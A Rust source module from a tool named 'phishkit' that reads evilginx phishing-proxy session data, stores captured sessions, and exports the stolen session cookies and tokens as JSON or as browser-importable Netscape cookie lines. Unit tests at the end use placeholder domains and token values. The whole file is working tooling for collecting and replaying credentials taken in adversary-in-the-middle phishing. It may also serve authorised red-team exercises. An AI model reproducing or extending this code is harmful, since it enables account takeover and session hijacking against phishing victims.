use std::collections::HashMap;
use std::fs;
use std::path::Path;

use serde_json::{json, Value};

use crate::db::{self, CaptureRow};
use crate::error::{AppError, AppResult};
use crate::setup;

fn read_bulk(buf: &[u8], i: usize) -> AppResult<(Vec<u8>, usize)> {
    if i >= buf.len() || buf[i] != b'$' {
        return Err(AppError::msg("buntdb: expected $"));
    }
    let j = buf[i + 1..]
        .iter()
        .position(|&b| b == b'\r')
        .map(|p| i + 1 + p)
        .ok_or_else(|| AppError::msg("buntdb: no CRLF"))?;
    let n: usize = std::str::from_utf8(&buf[i + 1..j])
        .map_err(|_| AppError::msg("buntdb len"))?
        .parse()
        .map_err(|_| AppError::msg("buntdb len parse"))?;
    let start = j + 2;
    let end = start + n;
    if end + 2 > buf.len() || &buf[end..end + 2] != b"\r\n" {
        return Err(AppError::msg("buntdb bulk trailer"));
    }
    Ok((buf[start..end].to_vec(), end + 2))
}

fn iter_commands(path: &Path) -> AppResult<Vec<Vec<Vec<u8>>>> {
    let buf = fs::read(path)?;
    let mut i = 0;
    let mut out = Vec::new();
    while i < buf.len() {
        if buf[i] != b'*' {
            break;
        }
        let j = buf[i + 1..]
            .iter()
            .position(|&b| b == b'\r')
            .map(|p| i + 1 + p)
            .ok_or_else(|| AppError::msg("buntdb argc"))?;
        let argc: usize = std::str::from_utf8(&buf[i + 1..j])
            .unwrap_or("0")
            .parse()
            .unwrap_or(0);
        i = j + 2;
        let mut parts = Vec::new();
        for _ in 0..argc {
            let (v, ni) = read_bulk(&buf, i)?;
            parts.push(v);
            i = ni;
        }
        out.push(parts);
    }
    Ok(out)
}

pub fn latest_sessions_from_db(path: &Path) -> AppResult<HashMap<i64, Value>> {
    let mut state: HashMap<String, String> = HashMap::new();
    for cmd in iter_commands(path)? {
        if cmd.is_empty() {
            continue;
        }
        let op = String::from_utf8_lossy(&cmd[0]).to_ascii_lowercase();
        if op == "set" && cmd.len() >= 3 {
            let key = String::from_utf8_lossy(&cmd[1]).to_string();
            let val = String::from_utf8_lossy(&cmd[2]).to_string();
            state.insert(key, val);
        } else if op == "del" && cmd.len() >= 2 {
            let key = String::from_utf8_lossy(&cmd[1]).to_string();
            state.remove(&key);
        }
    }
    let mut out = HashMap::new();
    for (key, val) in state {
        if !key.starts_with("sessions:") || key.ends_with(":id") {
            continue;
        }
        if let Ok(rec) = serde_json::from_str::<Value>(&val) {
            if let Some(sid) = rec.get("id").and_then(|v| v.as_i64()) {
                out.insert(sid, rec);
            }
        }
    }
    Ok(out)
}

fn evilginx_db_path() -> AppResult<std::path::PathBuf> {
    let primary = setup::evilginx_data_dir()?.join("data.db");
    if primary.is_file() {
        return Ok(primary);
    }
    // Legacy kit-tree location (pre OS data dir).
    if let Ok(root) = crate::kit::kit_root() {
        let legacy = root.join("kit/evilginx/run/data/data.db");
        if legacy.is_file() {
            return Ok(legacy);
        }
    }
    Err(AppError::msg(format!(
        "evilginx DB not found at {} — start evilginx first",
        primary.display()
    )))
}

pub fn sync_captures(profile_id: String) -> AppResult<Vec<CaptureRow>> {
    let path = evilginx_db_path()?;
    let sessions = latest_sessions_from_db(&path)?;
    for (sid, rec) in &sessions {
        let create = rec.get("create_time").and_then(|v| v.as_i64());
        let update = rec.get("update_time").and_then(|v| v.as_i64());
        db::upsert_capture(&profile_id, *sid, rec, create, update)?;
    }
    db::list_captures(&profile_id)
}

pub fn list_captures(profile_id: String) -> AppResult<Vec<CaptureRow>> {
    db::list_captures(&profile_id)
}

pub fn delete_capture(profile_id: String, evilginx_session_id: i64) -> AppResult<()> {
    db::ignore_and_delete_capture(&profile_id, evilginx_session_id)
}

pub fn prune_captures(profile_id: String) -> AppResult<serde_json::Value> {
    let n = db::prune_empty_captures(&profile_id)?;
    Ok(json!({"pruned": n}))
}

/// Export captured evilginx tokens. Reads all three evilginx token maps
/// (`tokens` = cookie tokens, `body_tokens`, `http_tokens`) rather than only
/// `tokens`, so material captured in any map is surfaced (issue #17).
///
/// JSON output shape (changed in #17): `{ "cookies": <tokens>, "body_tokens":
/// <body_tokens>, "http_tokens": <http_tokens> }`. The old shape returned the
/// bare `tokens` object; consumers that read it directly should now read
/// `.cookies`. Netscape output still emits browser-importable cookie lines from
/// `tokens`; when `tokens` is empty but body/http tokens exist, a comment note
/// is emitted so the operator knows material lives in another map.
pub fn export_capture_cookies(
    profile_id: String,
    evilginx_session_id: i64,
    format: String,
) -> AppResult<String> {
    let rows = db::list_captures(&profile_id)?;
    let row = rows
        .into_iter()
        .find(|c| c.evilginx_session_id == evilginx_session_id)
        .ok_or_else(|| AppError::msg("capture not found"))?;
    let tokens = row.data.get("tokens").cloned().unwrap_or(json!({}));
    let body_tokens = row.data.get("body_tokens").cloned().unwrap_or(json!({}));
    let http_tokens = row.data.get("http_tokens").cloned().unwrap_or(json!({}));
    let fmt = format.trim().to_ascii_lowercase();
    if fmt == "json" || fmt.is_empty() {
        let out = json!({
            "cookies": tokens,
            "body_tokens": body_tokens,
            "http_tokens": http_tokens,
        });
        return Ok(serde_json::to_string_pretty(&out)?);
    }
    if fmt != "netscape" {
        return Err(AppError::msg("format must be json or netscape"));
    }
    // tokens: { "domain.com": { "name": { "value": "...", "path": "/", ... }, ... }, ... }
    let mut out = String::from("# Netscape HTTP Cookie File\n# Generated by phishkit\n");
    let mut emitted = 0usize;
    if let Some(domains) = tokens.as_object() {
        for (domain, cookies) in domains {
            let host = domain.trim_start_matches('.');
            let include_sub = domain.starts_with('.');
            if let Some(map) = cookies.as_object() {
                for (name, meta) in map {
                    let (value, path, secure, expires) = if let Some(obj) = meta.as_object() {
                        let value = obj
                            .get("Value")
                            .or_else(|| obj.get("value"))
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let path = obj
                            .get("Path")
                            .or_else(|| obj.get("path"))
                            .and_then(|v| v.as_str())
                            .unwrap_or("/")
                            .to_string();
                        let secure = obj
                            .get("Secure")
                            .or_else(|| obj.get("secure"))
                            .and_then(|v| v.as_bool())
                            .unwrap_or(true);
                        let expires = obj
                            .get("Expires")
                            .or_else(|| obj.get("expires"))
                            .and_then(|v| v.as_i64())
                            .unwrap_or(0);
                        (value, path, secure, expires)
                    } else if let Some(s) = meta.as_str() {
                        (s.to_string(), "/".into(), true, 0i64)
                    } else {
                        continue;
                    };
                    if value.is_empty() {
                        continue;
                    }
                    out.push_str(&format!(
                        "{}\t{}\t{}\t{}\t{}\t{}\t{}\n",
                        if include_sub {
                            domain.clone()
                        } else {
                            host.to_string()
                        },
                        if include_sub { "TRUE" } else { "FALSE" },
                        path,
                        if secure { "TRUE" } else { "FALSE" },
                        expires,
                        name,
                        value
                    ));
                    emitted += 1;
                }
            }
        }
    }
    // Netscape format can only carry browser cookies. If there were no cookie
    // tokens but body/http tokens hold captured material, say so plainly instead
    // of handing back a bare header that looks like an empty capture.
    if emitted == 0 {
        let body_has = body_tokens
            .as_object()
            .map(|m| !m.is_empty())
            .unwrap_or(false);
        let http_has = http_tokens
            .as_object()
            .map(|m| !m.is_empty())
            .unwrap_or(false);
        if body_has || http_has {
            let mut which = Vec::new();
            if body_has {
                which.push("body_tokens");
            }
            if http_has {
                which.push("http_tokens");
            }
            out.push_str(&format!(
                "# No cookie tokens in this capture, but material was captured in: {}.\n\
                 # These cannot be expressed as Netscape cookies. Export with --format json to see them.\n",
                which.join(", ")
            ));
        }
    }
    Ok(out)
}

#[cfg(test)]
mod export_tests {
    use super::*;
    use crate::db;
    use serde_json::json;

    fn with_isolated_data<F: FnOnce()>(f: F) {
        let _g = crate::test_lock::env_guard();
        let tmp = tempfile::tempdir().unwrap();
        let data = tmp.path().join("data");
        fs::create_dir_all(&data).unwrap();
        std::env::set_var("PHISHKIT_DATA", &data);
        std::env::set_var("PHISHKIT_CONFIG", tmp.path().join("config"));
        f();
        std::env::remove_var("PHISHKIT_DATA");
        std::env::remove_var("PHISHKIT_CONFIG");
    }

    fn mk_profile(name: &str) -> String {
        let p =
            db::upsert_profile(serde_json::from_value(json!({ "name": name })).unwrap()).unwrap();
        p.id
    }

    fn insert(profile: &str, sid: i64, data: Value) {
        db::upsert_capture(profile, sid, &data, Some(1), Some(1)).unwrap();
    }

    // (a) A capture whose only material is in body_tokens/http_tokens is surfaced,
    // not reported as empty.
    #[test]
    fn body_http_only_capture_exports_non_empty() {
        with_isolated_data(|| {
            let profile = &mk_profile("bodyonly");
            insert(
                profile,
                101,
                json!({
                    "id": 101,
                    "tokens": {},
                    "body_tokens": { "login.example.com": { "csrf": "abc123" } },
                    "http_tokens": {}
                }),
            );

            let out = export_capture_cookies(profile.clone(), 101, "json".into()).unwrap();
            let v: Value = serde_json::from_str(&out).unwrap();
            assert_eq!(v["body_tokens"]["login.example.com"]["csrf"], "abc123");

            let net = export_capture_cookies(profile.clone(), 101, "netscape".into()).unwrap();
            assert!(
                net.contains("body_tokens"),
                "netscape note should name the non-empty map, got:\n{net}"
            );
            assert!(net.contains("--format json"));
        });
    }

    // (b) A cookie-only capture (material only in `tokens`) must NOT be pruned.
    #[test]
    fn cookie_only_capture_is_not_pruned() {
        with_isolated_data(|| {
            let profile = &mk_profile("cookieonly");
            insert(
                profile,
                202,
                json!({
                    "id": 202,
                    "tokens": { ".example.com": { "sid": { "Value": "tok", "Path": "/" } } },
                    "body_tokens": {},
                    "http_tokens": {}
                }),
            );
            insert(
                profile,
                203,
                json!({ "id": 203, "tokens": {}, "body_tokens": {}, "http_tokens": {} }),
            );

            let pruned = db::prune_empty_captures(profile).unwrap();
            assert_eq!(pruned, 1, "only the empty capture should be pruned");

            let remaining = db::list_captures(profile).unwrap();
            assert_eq!(remaining.len(), 1);
            assert_eq!(remaining[0].evilginx_session_id, 202);
        });
    }

    // (c) JSON export shape includes all three maps.
    #[test]
    fn export_json_shape_includes_all_three_maps() {
        with_isolated_data(|| {
            let profile = &mk_profile("shape");
            insert(
                profile,
                303,
                json!({
                    "id": 303,
                    "tokens": { ".example.com": { "sid": { "Value": "t" } } },
                    "body_tokens": { "a": 1 },
                    "http_tokens": { "b": 2 }
                }),
            );
            let out = export_capture_cookies(profile.clone(), 303, "json".into()).unwrap();
            let v: Value = serde_json::from_str(&out).unwrap();
            assert!(v.get("cookies").is_some(), "must have cookies key");
            assert!(v.get("body_tokens").is_some(), "must have body_tokens key");
            assert!(v.get("http_tokens").is_some(), "must have http_tokens key");
            assert_eq!(v["cookies"][".example.com"]["sid"]["Value"], "t");
        });
    }
}
